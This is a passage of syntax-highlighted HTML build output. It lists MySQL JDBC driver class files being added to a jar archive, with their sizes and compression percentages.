</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CallableStatement$CallableStatementParamInfo.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 6435<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2915<span style="color:#f92672">)(</span>deflated 54%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CallableStatement$CallableStatementParamInfoJDBC3.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1129<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 458<span style="color:#f92672">)(</span>deflated 59%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CallableStatement.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 29764<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 11182<span style="color:#f92672">)(</span>deflated 62%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CharsetMapping.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 11950<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 5943<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Charsets.properties<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2477<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 861<span style="color:#f92672">)(</span>deflated 65%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Clob.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 5148<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2409<span style="color:#f92672">)(</span>deflated 53%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CommunicationsException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3552<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1703<span style="color:#f92672">)(</span>deflated 52%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CompressedInputStream.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4684<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2555<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Connection$1.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1135<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 686<span style="color:#f92672">)(</span>deflated 39%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Connection$CompoundCacheKey.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1326<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 728<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Connection$UltraDevWorkAround.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 20359<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 4395<span style="color:#f92672">)(</span>deflated 78%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Connection.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 67031<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 33151<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionFeatureNotAvailableException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 830<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 439<span style="color:#f92672">)(</span>deflated 47%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionProperties$1.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 372<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 236<span style="color:#f92672">)(</span>deflated 36%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionProperties$BooleanConnectionProperty.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2243<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1060<span style="color:#f92672">)(</span>deflated 52%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionProperties$ConnectionProperty.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 5207<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2337<span style="color:#f92672">)(</span>deflated 55%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionProperties$IntegerConnectionProperty.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3334<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1468<span style="color:#f92672">)(</span>deflated 55%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionProperties$MemorySizeConnectionProperty.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2133<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1104<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionProperties$StringConnectionProperty.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2341<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 994<span style="color:#f92672">)(</span>deflated 57%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionProperties.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 63336<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 22225<span style="color:#f92672">)(</span>deflated 64%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ConnectionPropertiesTransform.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 283<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 184<span style="color:#f92672">)(</span>deflated 34%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Constants.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 384<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 281<span style="color:#f92672">)(</span>deflated 26%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/CursorRowProvider.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4730<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2102<span style="color:#f92672">)(</span>deflated 55%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$1.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3827<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1962<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$2.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 6158<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 3099<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$3.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 5352<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2531<span style="color:#f92672">)(</span>deflated 52%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$4.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3378<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1637<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$5.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3274<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1617<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$6.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3274<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1692<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$7.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3276<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1626<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$8.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3818<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1940<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$9.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4511<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2347<span style="color:#f92672">)(</span>deflated 47%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$IterateBlock.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1143<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 589<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$IteratorWithCleanup.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 716<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 392<span style="color:#f92672">)(</span>deflated 45%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$LocalAndReferencedColumns.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1066<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 530<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$ResultSetIterator.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1249<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 609<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$SingleStringIterator.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1121<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 562<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData$TypeDescriptor.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4663<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2634<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaData.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 68855<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 27275<span style="color:#f92672">)(</span>deflated 60%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DatabaseMetaDataUsingInfoSchema.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 15351<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 5479<span style="color:#f92672">)(</span>deflated 64%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/DocsConnectionPropsHelper.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 718<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 409<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Driver.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 692<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 426<span style="color:#f92672">)(</span>deflated 38%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/EscapeProcessor.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 11338<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 5906<span style="color:#f92672">)(</span>deflated 47%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/EscapeProcessorResult.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 462<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 313<span style="color:#f92672">)(</span>deflated 32%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/EscapeTokenizer.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2138<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1237<span style="color:#f92672">)(</span>deflated 42%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ExportControlled.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1980<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1024<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Field.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 12253<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 5730<span style="color:#f92672">)(</span>deflated 53%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/LicenseConfiguration.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 502<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 315<span style="color:#f92672">)(</span>deflated 37%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/LocalizedErrorMessages.properties<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 21861<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 6062<span style="color:#f92672">)(</span>deflated 72%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Messages.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2744<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1363<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/MiniAdmin.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1425<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 686<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/MysqlDataTruncation.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 815<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 483<span style="color:#f92672">)(</span>deflated 40%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/MysqlDefs.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 7862<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 3812<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/MysqlErrorNumbers.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 13677<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 5204<span style="color:#f92672">)(</span>deflated 61%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/MysqlIO.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 53305<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 27564<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/MysqlParameterMetadata.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2161<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 897<span style="color:#f92672">)(</span>deflated 58%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/MysqlSavepoint.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1646<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 928<span style="color:#f92672">)(</span>deflated 43%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NamedPipeSocketFactory$NamedPipeSocket.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1881<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 805<span style="color:#f92672">)(</span>deflated 57%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NamedPipeSocketFactory$RandomAccessFileInputStream.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1339<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 619<span style="color:#f92672">)(</span>deflated 53%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NamedPipeSocketFactory$RandomAccessFileOutputStream.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1266<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 617<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NamedPipeSocketFactory.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1978<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 909<span style="color:#f92672">)(</span>deflated 54%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NonRegisteringDriver.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 9521<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 4561<span style="color:#f92672">)(</span>deflated 52%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NonRegisteringReplicationDriver.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2474<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1257<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NotImplemented.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 480<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 301<span style="color:#f92672">)(</span>deflated 37%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/NotUpdatable.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 893<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 481<span style="color:#f92672">)(</span>deflated 46%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/OperationNotSupportedException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 529<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 320<span style="color:#f92672">)(</span>deflated 39%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/OutputStreamWatcher.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 201<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 150<span style="color:#f92672">)(</span>deflated 25%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/PacketTooBigException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 930<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 469<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/PreparedStatement$BatchParams.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1224<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 685<span style="color:#f92672">)(</span>deflated 44%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/PreparedStatement$EndPoint.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 647<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 375<span style="color:#f92672">)(</span>deflated 42%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/PreparedStatement$ParseInfo.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4277<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2447<span style="color:#f92672">)(</span>deflated 42%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/PreparedStatement.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 45810<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 22848<span style="color:#f92672">)(</span>deflated 50%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ReplicationConnection.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 7733<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2698<span style="color:#f92672">)(</span>deflated 65%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ReplicationDriver.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 731<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 433<span style="color:#f92672">)(</span>deflated 40%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ResultSet.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 82281<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 36039<span style="color:#f92672">)(</span>deflated 56%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ResultSetMetaData.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 7948<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 3836<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/RowData.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 970<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 473<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/RowDataDynamic$OperationNotSupportedException.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 771<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 406<span style="color:#f92672">)(</span>deflated 47%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/RowDataDynamic.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 6083<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2640<span style="color:#f92672">)(</span>deflated 56%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/RowDataStatic.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2781<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1186<span style="color:#f92672">)(</span>deflated 57%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/SQLError.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 15017<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 6323<span style="color:#f92672">)(</span>deflated 57%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Security.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4076<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2342<span style="color:#f92672">)(</span>deflated 42%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ServerPreparedStatement$BatchedBindValues.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 875<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 450<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ServerPreparedStatement$BindValue.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 2291<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1184<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/ServerPreparedStatement.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 35021<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 17081<span style="color:#f92672">)(</span>deflated 51%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/SingleByteCharsetConverter.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 3607<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 1913<span style="color:#f92672">)(</span>deflated 46%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/SocketFactory.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 380<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 235<span style="color:#f92672">)(</span>deflated 38%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/StandardSocketFactory.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 4324<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 2188<span style="color:#f92672">)(</span>deflated 49%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Statement$1.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1755<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 928<span style="color:#f92672">)(</span>deflated 47%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Statement$CachedResultSetMetaData.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 747<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 427<span style="color:#f92672">)(</span>deflated 42%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>adding: com/mysql/jdbc/Statement$CancelTask.class<span style="color:#f92672">(</span>in <span style="color:#f92672">=</span> 1228<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>out<span style="color:#f92672">=</span> 630<span style="color:#f92672">)(</span>deflated 48%<span style="color:#f92672">)</span>
